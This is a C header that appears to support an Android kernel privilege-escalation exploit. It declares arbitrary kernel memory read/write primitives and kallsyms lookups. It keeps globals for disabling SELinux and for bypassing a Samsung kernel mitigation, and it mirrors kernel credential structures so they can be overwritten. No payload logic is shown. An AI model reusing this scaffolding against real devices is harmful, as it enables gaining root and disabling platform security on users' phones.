#ifndef UTILS_H
#define UTILS_H

#include <err.h>

#define DEBUG 0

#ifdef DEBUG
#include "android/log.h"
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif


#include <sys/prctl.h>
#define EXPLOIT_COMM "MJ116"
#define TASK_COMM_LEN 16

#define handle_error(msg) \
      do { perror(msg); exit(EXIT_FAILURE);  } while (0)

void *get_kallsym_address(const char *, char*);

extern int read_at_address_pipe(void* address, void* buf, size_t len);
extern int write_at_address_pipe(void* address, void* buf, size_t len);
#ifdef __GNUC_GNU_INLINE__
inline int writel_at_address_pipe(void* address, size_t val);
#else
extern inline int writel_at_address_pipe(void* address, size_t val);
#endif
#define get_addr_from_buf(x) ((void*)*(size_t*)(x))
void hexdump(void*, size_t);
/* For bypass samsung mitigation */
size_t get_mm_exe_file;
size_t sys_msync;
/* For bypass samsung mitigation end */

size_t task_prctl_offset;
void *selinux_enabled;
void *selinux_enforcing;
void *security_context_to_sid;
void *cap_task_create;
void *cap_task_prctl;
void *kernel_sock_ioctl;
void *security_ops;
// for call_usermodelhelp()
unsigned long poweroff_work_func;
unsigned long orderly_poweroff;
// for call_usermodelhelp() end
size_t k_security_ops;
size_t init_task;
#define KERNEL_START 0xffffffc000000000

struct list_head {
	struct list_head *next, *prev;
};

struct plist_node {
	int			prio;
	struct list_head	prio_list;
	struct list_head	node_list;
};





#define _KERNEL_CAPABILITY_U32S    2
typedef struct kernel_cap_struct {
	unsigned int cap[_KERNEL_CAPABILITY_U32S];
} kernel_cap_t;


#define u32 unsigned int
struct task_security_struct {
	u32 osid;		/* SID prior to last execve */
	u32 sid;		/* current SID */
	u32 exec_sid;		/* exec SID */
	u32 create_sid;		/* fscreate SID */
	u32 keycreate_sid;	/* keycreate SID */
	u32 sockcreate_sid;	/* fscreate SID */
};


#define CONFIG_KEYS 1
#define CONFIG_SECURITY 1

struct cred {
	unsigned int 	usage;
	unsigned int      uid;		/* real UID of the task */
	unsigned int	gid;		/* real GID of the task */
	unsigned int	suid;		/* saved UID of the task */
	unsigned int	sgid;		/* saved GID of the task */
	unsigned int	euid;		/* effective UID of the task */
	unsigned int	egid;		/* effective GID of the task */
	unsigned int	fsuid;		/* UID for VFS ops */
	unsigned int	fsgid;		/* GID for VFS ops */

      unsigned int      securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	void  *session_keyring; /* keyring inherited over fork */
	void 	*process_keyring; /* keyring private to this process */
	void 	*thread_keyring; /* keyring private to this thread */
	void 	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
};


#define TASK_COMM_LEN 16
struct task_list_for_comm{
      
  	struct list_head cpu_timers[3];

/* process credentials */
	const struct cred *real_cred; /* objective and real subjective task
					 * credentials (COW) */
	const struct cred *cred;	/* effective (overridable) subjective task
					 * credentials (COW) */
	char comm[TASK_COMM_LEN]; /* executable name excluding path
				     - access with [gs]et_task_comm (which lock
				       it with task_lock())
				     - initialized normally by setup_new_exec */    
};

#endif /* UTILS_H */
